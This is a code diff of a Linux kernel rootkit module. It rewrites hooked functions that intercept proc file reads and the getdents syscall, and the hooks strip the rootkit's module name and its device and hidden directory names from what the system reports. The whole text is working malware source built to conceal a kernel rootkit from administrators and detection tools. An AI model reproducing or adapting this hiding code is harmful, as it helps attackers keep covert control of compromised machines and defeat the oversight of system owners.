@@ -14,47 +14,41 @@ struct linux_dirent {
 
 ssize_t seq_read_fake(struct file *file, char __user *buf, size_t size, loff_t *ppos) 
 {
-	//delete rootkit name from entries
+	char *p;
 	ssize_t rval = orig_proc_read(file, buf, size, ppos);
 	printk("Ret val: %ld\n", rval);
-	char *p;
 	if ((p=strstr(buf, "rootkit_main")) != NULL) {
 		printk("Found rootkit in buffer...Removing:)\n");
+		//delete rootkit name from entries
 		memmove(p,p + strlen("rootkit_main"), strlen(p + strlen("rootkit_main")) + 1);
+		printk("Buf Val: %s\n", buf);
 		return rval - strlen("rootkit_main");
 	}
-	//printk("Buf Val: %s\n", buf);
 	return rval;
 }
 
 //Test fakeRead
-static asmlinkage int fakegetdents(int fd, struct linux_dirent __user *dirp, unsigned int count) {
+static asmlinkage int fakegetdents(int fd, struct linux_dirent __user *dirp, unsigned int count) 
+{
+	int ret;
+	struct linux_dirent *cur = dirp;
+	int i = 0;
+	ret = orig_getdents(fd, dirp, count);
 
-	int iterEnts; //buffer offset
-	struct linux_dirent *entry;
-	char *dentBuf; //buf holding dir entries
-	long ret = orig_getdents(fd, dirp, count); //get # of iterable entries
+	while(i < ret) {
+		if(strncmp(cur->d_name, DEVICE_NAME, strlen(DEVICE_NAME)) == 0) {
+			int reclen = cur->d_reclen; //len of dirent
+			char *next_rec = (char *)cur + reclen; //next dir rec
+			int len = (int)dirp + ret - (int)next_rec; //cast to int for +
+			memmove(cur, next_rec, len);
 
-	if(ret <= 0) {//error
-		return ret;
-	}
-	
-	dentBuf = (char *)dirp; 
-	for(iterEnts = 0; iterEnts < ret;) { //go through all entry names
-		entry = (struct linux_dirent *)(dentBuf + iterEnts); //get each entry
-		
-		//we will hide '.' files and rtkt name files
-		if(strcmp(entry->d_name, DEVICE_NAME) == 0 ||
-			strstr(entry->d_name, HIDDEN_DIR) != NULL) {
-			memcpy(dentBuf + iterEnts, dentBuf + iterEnts + entry->d_reclen, ret - (iterEnts + entry->d_reclen)); //copy non hidden files forwards
-			ret-= entry->d_reclen;
-			
+			ret -= reclen;
+			continue;
 		}
-		else {
-			iterEnts += entry->d_reclen;
-		}
+		i += cur->d_reclen;
+		cur = (struct linux_dirent *) ((char *)dirp + i);
 	}
-	return ret; //return # entries found
+	return ret;
 }
 
 static struct file_operations file_ops
